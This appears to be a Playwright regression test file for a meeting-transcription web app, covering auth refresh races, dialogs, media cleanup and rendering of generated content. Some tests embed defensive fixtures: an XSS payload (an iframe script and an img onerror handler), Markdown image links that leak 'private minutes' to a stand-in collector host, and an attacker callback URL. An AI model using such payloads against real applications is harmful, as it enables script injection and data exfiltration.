/* eslint-disable @typescript-eslint/no-explicit-any */
// API failures, storage denial and media-device failures are deliberately
// injected. These are browser/component regressions, not model-quality tests.
import { test, expect, type Page } from '@playwright/test'

async function defaults(page: Page) {
  await page.route('**/api/**', route => {
    const p = new URL(route.request().url()).pathname
    const payload = p.endsWith('/browser/status') ? { available: false, recordings: [], active_recording_id: null, state: 'unavailable', message: '' } : p.endsWith('/chat/models') ? { models: ['local'], default_model: 'local' }
      : p.endsWith('/llm/config') ? { is_active: true }
      : p.endsWith('/registration-status') ? { registration_enabled: false }
      : p.endsWith('/transcription/list') ? { jobs: [], pagination: { page: 1, pages: 1, total: 0 } }
      : p.endsWith('/config') ? {} : []
    return route.fulfill({ json: payload })
  })
}
async function visit(page: Page, scenario: string) { await page.goto(`/e2e/regression.html?case=${scenario}`) }
test.beforeEach(async ({ page }) => { page.on('pageerror', error => console.error('Browser error:', error.message)); await defaults(page) })

test('R033 storage getters and methods may throw without preventing theme changes or logout', async ({ page }) => {
  const errors: string[] = []
  page.on('pageerror', error => errors.push(error.message))
  await page.addInitScript(() => {
    Object.defineProperty(window, 'localStorage', { get() { throw new DOMException('blocked', 'SecurityError') } })
    Object.defineProperty(window, 'sessionStorage', { value: { getItem() { throw new DOMException('blocked', 'SecurityError') }, setItem() { throw new Error('blocked') }, removeItem() { throw new Error('blocked') } } })
  })
  await visit(page, 'storage')
  await expect(page.getByRole('heading', { name: 'Storage-independent application' })).toBeVisible()
  await page.getByRole('button', { name: 'Theme: light' }).click()
  await expect(page.getByRole('button', { name: 'Theme: dark' })).toBeVisible()
  await page.getByRole('button', { name: 'Logout', exact: true }).click()
  expect(errors).toEqual([])
})

test('R034 the 201st archived meeting can be opened and newer pages remain reachable', async ({ page }) => {
  const offsets: number[] = []
  await page.addInitScript(() => sessionStorage.setItem('mi.stationToken', 'synthetic-token'))
  await page.route('**/api/meeting-worker/v1/capabilities', route => route.fulfill({ json: { station: { worker_connected: false, recording_available: false, active_recording_id: null } } }))
  await page.route('**/api/meeting-worker/v1/jobs?*', route => {
    const params = new URL(route.request().url()).searchParams
    const offset = Number(params.get('offset')); offsets.push(offset)
    const jobs = Array.from({ length: Math.max(0, Math.min(Number(params.get('limit')), 201 - offset)) }, (_, i) => ({
      id: `meeting-${offset + i}`, meeting_id: `meeting-${offset + i}`, stage: 'queued', source_kind: 'text',
      manifest: { title: `Archived meeting ${offset + i + 1}`, language_mode: 'ru', output_language: 'ru' },
      created_at: '2026-09-23T00:00:00Z', updated_at: '2026-09-23T00:00:00Z',
    }))
    return route.fulfill({ json: jobs })
  })
  await visit(page, 'archive')
  for (let i = 0; i < 4; i++) {
    await page.getByRole('button', { name: 'Более ранние записи', exact: true }).click()
    await expect(page.getByText(`Страница ${i + 2} · Поиск по этой странице.`)).toBeVisible()
    await expect(page.getByRole('button', { name: new RegExp(`^Archived meeting ${50 * (i + 1) + 1}\\b`) })).toBeVisible()
  }
  await page.getByRole('button', { name: /Archived meeting 201/ }).click()
  await expect(page.getByRole('heading', { name: 'Archived meeting 201', exact: true })).toBeVisible()
  expect(offsets).toContain(200)
  await page.getByRole('button', { name: 'Более новые записи', exact: true }).click()
  await expect(page.getByText('Страница 4 · Поиск по этой странице.')).toBeVisible()
})

test('R035 concurrent 401s rotate once; a late failure cannot erase a newer login', async ({ page }) => {
  await visit(page, 'storage')
  const result = await page.evaluate(async () => {
    const { useAuthStore } = await import('/src/features/auth/store/authStore.ts')
    const { setupAuthInterceptor } = await import('/src/lib/authInterceptor.ts')
    const { refreshToken } = await import('/src/lib/authHelpers.ts')
    const state = useAuthStore.getState(); state.setToken('old')
    let count = 0
    const original = window.fetch
    window.fetch = async (input, init) => {
      if (String(input).endsWith('/auth/refresh')) {
        count++; await new Promise(resolve => setTimeout(resolve, 30))
        return Response.json({ token: 'fresh' })
      }
      return new Headers(init?.headers).get('Authorization') === 'Bearer fresh'
        ? Response.json({ ok: true }) : new Response('', { status: 401 })
    }
    setupAuthInterceptor()
    const responses = await Promise.all([fetch('/api/v1/one'), fetch('/api/v1/two'), fetch('/api/v1/three')])
    window.__scriberr_original_fetch = async () => {
      await new Promise(resolve => setTimeout(resolve, 30)); return new Response('', { status: 401 })
    }
    const inFlight = refreshToken()
    useAuthStore.getState().setToken('new-login')
    const token = await inFlight
    const answer = { count, statuses: responses.map(r => r.status), token, saved: useAuthStore.getState().token }
    window.fetch = original
    return answer
  })
  expect(result).toEqual({ count: 1, statuses: [200, 200, 200], token: 'new-login', saved: 'new-login' })
})

const attack = '<iframe srcdoc="<script>parent.__xss = true</script>"></iframe>\n\n<img src=x onerror="window.__xss=true">\n\n**Safe minutes**'
test('R005 generated summaries cannot execute raw HTML', async ({ page }) => {
  await page.route('**/api/v1/transcription/recording/summary', route => route.fulfill({ json: { content: attack } }))
  await visit(page, 'summary')
  await expect(page.getByText('Safe minutes', { exact: true })).toBeVisible()
  await expect(page.locator('iframe, img[src="x"]')).toHaveCount(0)
  expect(await page.evaluate(() => (window as any).__xss)).toBeUndefined()
})

test('R005/R038 chat renders hostile content safely and preserves byte-split Russian/Kazakh', async ({ page }) => {
  await page.route('**/api/v1/chat/transcriptions/recording/sessions', route => route.fulfill({ json: [{ id: 'session', title: 'Synthetic', model: 'local' }] }))
  await page.route('**/api/v1/chat/sessions/session', route => route.fulfill({ json: { messages: [{ id: 1, role: 'assistant', content: attack, created_at: '2026-09-23' }] } }))
  await page.addInitScript(() => {
    const original = window.fetch.bind(window)
    window.fetch = (input, init) => {
      if (String(input).endsWith('/session/messages')) {
        const bytes = new TextEncoder().encode('Қазақ тілі — русский текст')
        return Promise.resolve(new Response(new ReadableStream({ start(controller) { for (const byte of bytes) controller.enqueue(Uint8Array.of(byte)); controller.close() } }), { headers: { 'Content-Type': 'text/plain' } }))
      }
      return original(input, init)
    }
  })
  await visit(page, 'chat')
  await expect(page.getByText('Safe minutes', { exact: true })).toBeVisible()
  await expect(page.locator('iframe, img[src="x"]')).toHaveCount(0)
  await page.getByPlaceholder('Type your message...').fill('Synthetic question')
  await page.getByPlaceholder('Type your message...').press('Enter')
  await expect(page.getByText('Қазақ тілі — русский текст', { exact: true })).toBeVisible()
  expect(await page.evaluate(() => (window as any).__xss)).toBeUndefined()
})

for (const view of ['summary', 'chat']) {
  test(`R005 ${view} never loads images embedded in generated Markdown`, async ({ page }) => {
    const loads: string[] = []
    page.on('request', request => { if (request.url().includes('markdown-leak')) loads.push(request.url()) })
    await page.route('**/*markdown-leak*', route => route.abort())
    const markdown = '**Private minutes**\n\n![External](https://collector.invalid/markdown-leak?private=minutes)\n\n![Relative](/markdown-leak?private=minutes)\n\n![Reference][image]\n\n[image]: //collector.invalid/markdown-leak?private=minutes'
    if (view === 'summary') {
      await page.route('**/api/v1/transcription/recording/summary', route => route.fulfill({ json: { content: markdown } }))
    } else {
      await page.route('**/api/v1/chat/transcriptions/recording/sessions', route => route.fulfill({ json: [{ id: 'session', title: 'Synthetic', model: 'local' }] }))
      await page.route('**/api/v1/chat/sessions/session', route => route.fulfill({ json: { messages: [{ id: 1, role: 'assistant', content: markdown, created_at: '2026-09-23' }] } }))
      await page.route('**/api/v1/chat/sessions/session/messages', route => route.fulfill({ contentType: 'text/plain', body: '![Streamed](https://collector.invalid/markdown-leak?private=stream)' }))
    }
    await visit(page, view)
    await expect(page.getByText('Private minutes', { exact: true })).toBeVisible()
    for (const label of ['External', 'Relative', 'Reference']) {
      await expect(page.getByText(`[Image omitted: ${label}]`, { exact: true })).toBeVisible()
    }
    if (view === 'chat') {
      await page.getByPlaceholder('Type your message...').fill('Synthetic follow-up')
      await page.getByPlaceholder('Type your message...').press('Enter')
      await expect(page.getByText('[Image omitted: Streamed]', { exact: true })).toBeVisible()
    }
    await expect(page.locator('img[src*="markdown-leak"]')).toHaveCount(0)
    expect(loads).toEqual([])
  })
}

test('R039 non-2xx and JSON responses preserve the previous valid summary', async ({ page }) => {
  let attempt = 0
  await page.route('**/api/v1/summarize', route => {
    attempt++
    return attempt === 1 ? route.fulfill({ body: 'Approved earlier summary', contentType: 'text/plain' })
      : attempt === 2 ? route.fulfill({ status: 500, json: { error: 'private server diagnostic' } })
        : route.fulfill({ json: { error: 'wrong success contract' } })
  })
  await visit(page, 'summary-request')
  await page.getByRole('button', { name: 'Generate', exact: true }).click()
  await expect(page.getByTestId('summary')).toHaveText('Approved earlier summary')
  await page.getByRole('button', { name: 'Generate', exact: true }).click()
  await expect(page.getByRole('alert')).toContainText('500')
  await expect(page.getByTestId('summary')).toHaveText('Approved earlier summary')
  await page.getByRole('button', { name: 'Generate', exact: true }).click()
  await expect(page.getByRole('alert')).toContainText('unexpected summary format')
  await expect(page.getByTestId('summary')).toHaveText('Approved earlier summary')
})

test('R040 template POST failure preserves edited fields and allows retry', async ({ page }) => {
  let shouldFail = true
  await page.route('**/api/v1/summaries', route => route.request().method() === 'POST'
    ? route.fulfill({ status: shouldFail ? 500 : 201, json: { id: 'template' } }) : route.fulfill({ json: [] }))
  await visit(page, 'settings')
  await page.getByRole('tab', { name: 'Summary', exact: true }).click()
  await page.getByRole('button', { name: 'New Template' }).click()
  await page.getByLabel('Template Name').fill('Minutes for secretary')
  await page.getByLabel('Prompt', { exact: true }).fill('Preserve every responsibility.')
  await page.getByRole('button', { name: 'Create Template', exact: true }).click()
  await expect(page.getByRole('alert')).toContainText('500')
  await expect(page.getByLabel('Template Name')).toHaveValue('Minutes for secretary')
  await expect(page.getByLabel('Prompt', { exact: true })).toHaveValue('Preserve every responsibility.')
  shouldFail = false
  await page.getByRole('button', { name: 'Create Template', exact: true }).click()
  await expect(page.getByRole('dialog')).toBeHidden()
})

test('R040 authentication renewal refreshes model choices without resetting the template draft', async ({ page }) => {
  let loads = 0
  await page.route('**/api/v1/chat/models', route => { loads++; return route.fulfill({ json: { models: ['local', 'other-local'] } }) })
  await visit(page, 'settings')
  await page.getByRole('tab', { name: 'Summary', exact: true }).click()
  await page.getByRole('button', { name: 'New Template' }).click()
  await page.getByLabel('Template Name').fill('Unsaved secretary draft')
  await page.getByLabel('Description').fill('Keep my edits after login renews')
  await page.getByLabel('Prompt', { exact: true }).fill('Keep every assignment and its source.')
  await page.getByRole('combobox').click()
  await page.getByRole('option', { name: 'other-local', exact: true }).click()
  await page.getByRole('switch').click()
  const before = loads
  await page.evaluate(async () => {
    const { useAuthStore } = await import('/src/features/auth/store/authStore.ts')
    useAuthStore.getState().setToken('synthetic-rotated-token')
  })
  await expect.poll(() => loads).toBeGreaterThan(before)
  await expect(page.getByLabel('Template Name')).toHaveValue('Unsaved secretary draft')
  await expect(page.getByLabel('Description')).toHaveValue('Keep my edits after login renews')
  await expect(page.getByLabel('Prompt', { exact: true })).toHaveValue('Keep every assignment and its source.')
  await expect(page.getByRole('combobox')).toHaveText('other-local')
  await expect(page.getByRole('switch')).toBeChecked()
})

test('R040 pending template saves block cancel, Escape, backdrop and further edits', async ({ page }) => {
  let finish!: () => void
  const pending = new Promise<void>(resolve => { finish = resolve })
  let started = false
  await page.route('**/api/v1/summaries', async route => {
    if (route.request().method() !== 'POST') return route.fulfill({ json: [] })
    started = true
    await pending
    return route.fulfill({ status: 201, json: { id: 'template' } })
  })
  await visit(page, 'settings')
  await page.getByRole('tab', { name: 'Summary', exact: true }).click()
  await page.getByRole('button', { name: 'New Template' }).click()
  await page.getByLabel('Template Name').fill('Template A')
  await page.getByLabel('Prompt', { exact: true }).fill('Pending A')
  await page.getByRole('button', { name: 'Create Template', exact: true }).click()
  await expect.poll(() => started).toBe(true)
  await expect(page.getByRole('button', { name: 'Cancel', exact: true })).toBeDisabled()
  await expect(page.getByRole('button', { name: 'Close', exact: true })).toHaveCount(0)
  await expect(page.getByLabel('Template Name')).toBeDisabled()
  await page.keyboard.press('Escape')
  await page.mouse.click(4, 4)
  await expect(page.getByRole('dialog')).toBeVisible()
  await expect(page.getByLabel('Template Name')).toHaveValue('Template A')
  finish()
  await expect(page.getByRole('dialog')).toBeHidden()
  await page.getByRole('button', { name: 'New Template' }).click()
  await page.getByLabel('Template Name').fill('Template B')
  await expect(page.getByLabel('Template Name')).toHaveValue('Template B')
})

test('R040 a save from an unmounted template dialog cannot close its replacement', async ({ page }) => {
  let finish!: () => void
  const pending = new Promise<void>(resolve => { finish = resolve })
  let started = false
  let listRequests = 0
  await page.route('**/api/v1/summaries', async route => {
    if (route.request().method() !== 'POST') { listRequests++; return route.fulfill({ json: [] }) }
    started = true
    await pending
    return route.fulfill({ status: 201, json: { id: 'template' } })
  })
  await visit(page, 'settings')
  await page.getByRole('tab', { name: 'Summary', exact: true }).click()
  await page.getByRole('button', { name: 'New Template' }).click()
  await page.getByLabel('Template Name').fill('Template A')
  await page.getByLabel('Prompt', { exact: true }).fill('Pending A')
  await page.getByRole('button', { name: 'Create Template', exact: true }).click()
  await expect.poll(() => started).toBe(true)
  // Simulate parent-driven navigation; the modal itself blocks user dismissal.
  await page.locator('[role="tab"][aria-label="Transcription"]').evaluate(element => element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0 })))
  await expect(page.getByRole('dialog')).toBeHidden()
  await page.getByRole('tab', { name: 'Summary', exact: true }).click()
  await page.getByLabel('Template Name').fill('Replacement B')
  await page.getByLabel('Prompt', { exact: true }).fill('Unsaved replacement')
  const beforeFinish = listRequests
  const completed = page.waitForResponse(response => response.url().endsWith('/api/v1/summaries') && response.request().method() === 'POST')
  finish()
  await completed
  // Waiting for the refresh proves the parent's awaited save callback completed.
  await expect.poll(() => listRequests).toBeGreaterThan(beforeFinish)
  await expect(page.getByLabel('Template Name')).toHaveValue('Replacement B')
  await expect(page.getByLabel('Prompt', { exact: true })).toHaveValue('Unsaved replacement')
})

test('R043 segment-only output stays readable and timestamp controls seek', async ({ page }) => {
  await visit(page, 'segments')
  await expect(page.getByText('Айгерім жібереді.', { exact: true })).toBeVisible()
  await page.getByRole('button', { name: 'Seek to 12 seconds' }).click()
  await expect(page.locator('output').first()).toHaveText('12')
})

test('R044 rejected note POST keeps the note and selected evidence for retry', async ({ page }) => {
  await page.route('**/api/v1/transcription/recording/notes', route => route.request().method() === 'POST' ? route.fulfill({ status: 500, json: { error: 'failed' } }) : route.fulfill({ json: [] }))
  await visit(page, 'notes')
  await expect(page.locator('[data-transcript-text]')).toBeVisible()
  await page.locator('[data-transcript-text]').evaluate(element => {
    const range = document.createRange(); range.setStart(element.firstChild!, 0); range.setEnd(element.firstChild!, element.firstChild!.textContent!.length)
    const selection = window.getSelection()!; selection.removeAllRanges(); selection.addRange(range)
    document.dispatchEvent(new Event('selectionchange')); document.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }))
  })
  await page.getByRole('button', { name: 'Note', exact: true }).click()
  await page.getByPlaceholder('Write your note here...').fill('Secretary correction must survive a failure.')
  await page.getByRole('button', { name: 'Save Note', exact: true }).click()
  await expect(page.getByRole('alert')).toContainText('Failed to create note')
  await expect(page.getByPlaceholder('Write your note here...')).toHaveValue('Secretary correction must survive a failure.')
})

for (const mobile of [false, true]) {
  test(`R044 pending note save blocks all ${mobile ? 'mobile' : 'desktop'} dismissal paths`, async ({ page }) => {
    if (mobile) await page.setViewportSize({ width: 390, height: 844 })
    let finish!: () => void
    const pending = new Promise<void>(resolve => { finish = resolve })
    let started = false
    await page.route('**/api/v1/transcription/recording/notes', async route => {
      if (route.request().method() !== 'POST') return route.fulfill({ json: [] })
      started = true
      await pending
      return route.fulfill({ status: 201, json: { id: 'note' } })
    })
    await visit(page, 'notes')
    const selectQuote = async () => {
      await page.locator('[data-transcript-text]').evaluate(element => {
        const range = document.createRange(); range.setStart(element.firstChild!, 0); range.setEnd(element.firstChild!, element.firstChild!.textContent!.length)
        const selection = window.getSelection()!; selection.removeAllRanges(); selection.addRange(range)
        document.dispatchEvent(new Event('selectionchange'))
      })
      await page.getByRole('button', { name: /^(Add )?Note$/, exact: true }).click()
    }
    await selectQuote()
    await page.getByPlaceholder('Write your note here...').fill('Pending note A')
    await page.getByRole('button', { name: 'Save Note', exact: true }).click()
    await expect.poll(() => started).toBe(true)
    await expect(page.getByRole('button', { name: 'Cancel', exact: true })).toBeDisabled()
    await expect(page.getByRole('button', { name: 'Close', exact: true })).toBeDisabled()
    await expect(page.getByPlaceholder('Write your note here...')).toBeDisabled()
    await page.keyboard.press('Escape')
    await page.mouse.click(4, 4)
    await expect(page.getByRole('dialog', { name: 'Add Note', exact: true })).toBeVisible()
    await expect(page.getByPlaceholder('Write your note here...')).toHaveValue('Pending note A')
    finish()
    await expect(page.getByRole('dialog', { name: 'Add Note', exact: true })).toBeHidden()
    await page.getByRole('button', { name: 'Close notes', exact: true }).click()
    await selectQuote()
    await page.getByPlaceholder('Write your note here...').fill('New note B')
    await expect(page.getByPlaceholder('Write your note here...')).toHaveValue('New note B')
  })
}

for (const status of [404, 410, 503]) {
  test(`R046 status ${status} ends polling and retains the source for retry`, async ({ page }) => {
    let polls = 0
    await page.route('**/api/v1/transcription/quick', route => route.fulfill({ json: { id: 'quick-id', status: 'processing' } }))
    await page.route('**/api/v1/transcription/quick/quick-id', route => { polls++; return route.fulfill({ status, json: { error: 'unavailable' } }) })
    await visit(page, 'quick')
    await page.locator('input[type=file]').setInputFiles({ name: 'synthetic.wav', mimeType: 'audio/wav', buffer: Buffer.from('synthetic audio fixture') })
    await page.getByRole('button', { name: 'Start Transcription' }).click()
    await expect(page.getByRole('button', { name: 'Start Transcription' })).toBeVisible({ timeout: 16000 })
    expect(polls).toBe(status === 503 ? 5 : 1)
    await expect(page.getByText('synthetic.wav', { exact: true })).toBeVisible()
    const ended = polls
    await page.waitForTimeout(2300)
    expect(polls).toBe(ended)
  })
}

async function mediaDevices(page: Page, failure = '') {
  await page.addInitScript(fail => {
    const state = { streams: [] as MediaStream[], contexts: [] as AudioContext[], display: null as MediaStream | null }
    ;(window as any).__capture = state
    const originalMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices)
    navigator.mediaDevices.getUserMedia = async constraints => {
      const stream = await originalMedia(constraints); state.streams.push(stream); return stream
    }
    navigator.mediaDevices.getDisplayMedia = async () => {
      const audio = await navigator.mediaDevices.getUserMedia({ audio: true })
      const canvas = document.createElement('canvas'); canvas.width = 10; canvas.height = 10
      const video = canvas.captureStream(); state.streams.push(video)
      const display = new MediaStream([...video.getTracks(), ...audio.getTracks()]); state.display = display; state.streams.push(display)
      return display
    }
    const OriginalContext = window.AudioContext
    window.AudioContext = class extends OriginalContext {
      constructor(...args: ConstructorParameters<typeof AudioContext>) { super(...args); state.contexts.push(this) }
      createGain() { if (fail === 'mix') throw new Error('Injected audio mixing failure'); return super.createGain() }
    }
    if (fail === 'recorder') window.MediaRecorder = class { constructor() { throw new Error('Injected MediaRecorder failure') } } as any
  }, failure)
  page.on('dialog', dialog => dialog.accept())
}

for (const recorder of ['microphone', 'system']) {
  test(`R006 ${recorder} retains its real recorded Blob after a rejected upload`, async ({ page }) => {
    await mediaDevices(page)
    await page.route('**/api/v1/transcription/upload', route => route.fulfill({ status: 413, json: { error: 'too large' } }))
    await visit(page, recorder)
    await page.getByRole('button', { name: 'Start Recording', exact: true }).click()
    await expect(page.getByRole('button', { name: recorder === 'system' ? 'Stop Recording' : 'Stop', exact: true })).toBeVisible()
    await page.waitForTimeout(650)
    await page.getByRole('button', { name: recorder === 'system' ? 'Stop Recording' : 'Stop', exact: true }).click()
    await page.getByRole('button', { name: 'Upload Recording', exact: true }).click()
    await expect(page.getByRole('button', { name: 'Upload Recording', exact: true })).toBeEnabled()
    const downloading = page.waitForEvent('download')
    await page.getByRole('button', { name: 'Download recording', exact: true }).click()
    const download = await downloading
    expect(await download.failure()).toBeNull()
    const stream = await download.createReadStream()
    let bytes = 0
    for await (const chunk of stream!) bytes += chunk.length
    expect(bytes).toBeGreaterThan(0)
  })
}

test('R036 browser Stop Sharing stops all tracks and yields a saved recording', async ({ page }) => {
  await mediaDevices(page)
  await visit(page, 'system')
  await page.getByRole('button', { name: 'Start Recording', exact: true }).click()
  await expect(page.getByRole('button', { name: 'Stop Recording', exact: true })).toBeVisible()
  await page.waitForTimeout(500)
  await page.evaluate(() => (window as any).__capture.display.getVideoTracks()[0].dispatchEvent(new Event('ended')))
  await expect(page.getByRole('button', { name: 'Upload Recording', exact: true })).toBeVisible()
  expect(await page.evaluate(() => (window as any).__capture.streams.every((s: MediaStream) => s.getTracks().every(t => t.readyState === 'ended')))).toBe(true)
  expect(await page.evaluate(() => (window as any).__capture.contexts.every((c: AudioContext) => c.state === 'closed'))).toBe(true)
})

for (const failure of ['mix', 'recorder']) {
  test(`R037 ${failure} failure releases every acquired media track and audio context`, async ({ page }) => {
    await mediaDevices(page, failure)
    await visit(page, 'system')
    await page.getByRole('button', { name: 'Start Recording', exact: true }).click()
    await expect(page.getByRole('button', { name: 'Start Recording', exact: true })).toBeEnabled()
    await expect.poll(() => page.evaluate(() => (window as any).__capture.streams.length)).toBeGreaterThan(2)
    await expect.poll(() => page.evaluate(() => (window as any).__capture.streams.every((s: MediaStream) => s.getTracks().every(t => t.readyState === 'ended')))).toBe(true)
    await expect.poll(() => page.evaluate(() => (window as any).__capture.contexts.every((c: AudioContext) => c.state === 'closed'))).toBe(true)
  })
}

test('R045 StrictMode reuses audio graph; real unmount closes every context', async ({ page }) => {
  await mediaDevices(page)
  const errors: string[] = []
  page.on('pageerror', error => errors.push(error.message))
  await visit(page, 'visualizer')
  for (let i = 0; i < 4; i++) {
    await expect.poll(() => page.evaluate(() => (window as any).__capture.contexts.filter((c: AudioContext) => c.state !== 'closed').length)).toBe(1)
    await page.getByRole('button', { name: 'Toggle visualizer' }).click()
    await expect.poll(() => page.evaluate(() => (window as any).__capture.contexts.every((c: AudioContext) => c.state === 'closed'))).toBe(true)
    if (i < 3) await page.getByRole('button', { name: 'Toggle visualizer' }).click()
  }
  expect(await page.evaluate(() => (window as any).__capture.contexts.length)).toBe(4)
  expect(errors).toEqual([])
})

async function tableData(page: Page, multi = false) {
  await page.addInitScript(() => localStorage.setItem('scriberr_swipe_hint_shown', 'true'))
  const records = ['first', 'second'].map(id => ({ id, title: id, is_multi_track: multi, audio_path: `${id}.wav`, status: 'failed', created_at: '2026-09-23T00:00:00Z' }))
  await page.route('**/api/v1/transcription/list?*', route => route.fulfill({ json: { jobs: records, pagination: { page: 1, pages: 1, total: 2 } } }))
}
async function selectRows(page: Page) {
  await page.getByRole('heading', { name: 'first', exact: true }).click({ modifiers: ['Shift'] })
  await page.getByRole('heading', { name: 'second', exact: true }).click()
}
for (const operation of ['start', 'delete']) {
  test(`R041 bulk ${operation} retains the rejected item selected and reports partial success`, async ({ page }) => {
    await tableData(page)
    const outcomes: string[] = []
    const alerts: string[] = []
    page.on('dialog', async dialog => { alerts.push(dialog.message()); await dialog.accept() })
    await page.route(operation === 'start' ? '**/api/v1/transcription/*/start' : '**/api/v1/transcription/*', route => {
      if (route.request().method() === 'GET') return route.fallback()
      const id = new URL(route.request().url()).pathname.split('/')[4]
      outcomes.push(route.request().url())
      return route.fulfill({ status: id === 'second' ? 409 : 200, json: {} })
    })
    await visit(page, 'table')
    await selectRows(page)
    // The floating bulk toolbar owns four icon controls: profile, advanced,
    // delete and clear. Locate it by its Selected label and button count.
    const selectedBar = page.getByText('Selected', { exact: true }).locator('..').locator('..')
    await selectedBar.locator('button').nth(operation === 'start' ? 1 : 2).click()
    if (operation === 'start') await page.getByRole('button', { name: 'Start Transcription', exact: true }).click()
    else await page.getByRole('button', { name: 'Delete', exact: true }).click()
    await expect.poll(() => outcomes.length).toBe(2)
    await expect.poll(() => alerts.join('\n')).toContain('second')
    expect(alerts.join('\n')).toContain('409')
    await expect(selectedBar).toContainText('1')
  })
}

for (const multi of [false, true]) {
  test(`R042 advanced table start preserves multi-track=${multi}`, async ({ page }) => {
    await tableData(page, multi)
    let parameters: any
    await page.route('**/api/v1/transcription/first/start', route => { parameters = route.request().postDataJSON(); return route.fulfill({ json: {} }) })
    await visit(page, 'table')
    const row = page.getByRole('heading', { name: 'first', exact: true }).locator('..').locator('..').locator('..')
    await row.hover()
    await row.locator('button').nth(1).click()
    await page.getByRole('button', { name: 'Start Transcription', exact: true }).click()
    await expect.poll(() => parameters?.is_multi_track_enabled).toBe(multi)
  })
}

test('R010 CLI approval rejects an external callback and transmits the loopback nonce only after approval', async ({ page }) => {
  let posted: any
  await page.route('**/api/v1/auth/cli/authorize', route => {
    if (route.request().method() === 'POST') { posted = route.request().postDataJSON(); return route.fulfill({ status: 500, json: {} }) }
    return route.fulfill({ json: { user: { id: 1, username: 'secretary' } } })
  })
  const state = 'a'.repeat(43)
  await visit(page, `cli-auth&state=${state}&callback_url=${encodeURIComponent('https://attacker.invalid/callback')}`)
  await expect(page.getByText(/Invalid request: start login/)).toBeVisible()
  await expect(page.getByRole('button', { name: 'Approve', exact: true })).toHaveCount(0)
  const callback = 'http://127.0.0.1:43123/callback'
  await visit(page, `cli-auth&state=${state}&callback_url=${encodeURIComponent(callback)}`)
  await expect(page.getByText(callback, { exact: true })).toBeVisible()
  expect(posted).toBeUndefined()
  await page.getByRole('button', { name: 'Approve', exact: true }).click()
  expect(posted).toEqual({ callback_url: callback, state, device_name: 'CLI Device' })
})

test('R046 bounded queue pending status advances to processing and completed', async ({ page }) => {
  let polls = 0
  await page.route('**/api/v1/transcription/quick', route => route.fulfill({ json: { id: 'queued', status: 'pending' } }))
  await page.route('**/api/v1/transcription/quick/queued', route => {
    polls++
    return route.fulfill({ json: { id: 'queued', status: polls < 2 ? 'pending' : polls < 3 ? 'processing' : 'completed', transcript: polls >= 3 ? 'Синтетикалық тапсырма' : '' } })
  })
  await visit(page, 'quick')
  await page.locator('input[type=file]').setInputFiles({ name: 'synthetic.wav', mimeType: 'audio/wav', buffer: Buffer.from('synthetic audio fixture') })
  await page.getByRole('button', { name: 'Start Transcription' }).click()
  await expect(page.getByText('Queued for transcription…')).toBeVisible()
  await expect(page.getByText('Transcription Complete', { exact: true })).toBeVisible({ timeout: 12000 })
  await expect(page.getByText('Синтетикалық тапсырма', { exact: true })).toBeVisible()
  expect(polls).toBe(3)
})

for (const recorder of ['microphone', 'system']) {
  test(`R006 ${recorder} close asks before discarding an active recording`, async ({ page }) => {
    await mediaDevices(page)
    // Keep the active capture when the close/discard question is dismissed.
    page.removeAllListeners('dialog')
    const questions: string[] = []
    page.on('dialog', async dialog => { questions.push(dialog.message()); await dialog.dismiss() })
    await visit(page, recorder)
    await page.getByRole('button', { name: 'Start Recording', exact: true }).click()
    const stop = page.getByRole('button', { name: recorder === 'system' ? 'Stop Recording' : 'Stop', exact: true })
    await expect(stop).toBeVisible()
    await page.getByRole('button', { name: 'Close', exact: true }).click()
    expect(questions).toContain('Stop and discard the current recording? Choose Cancel, then Stop to keep and download it.')
    await expect(stop).toBeVisible()
    await stop.click()
    await expect(page.getByRole('button', { name: 'Download recording', exact: true })).toBeVisible()
  })
}
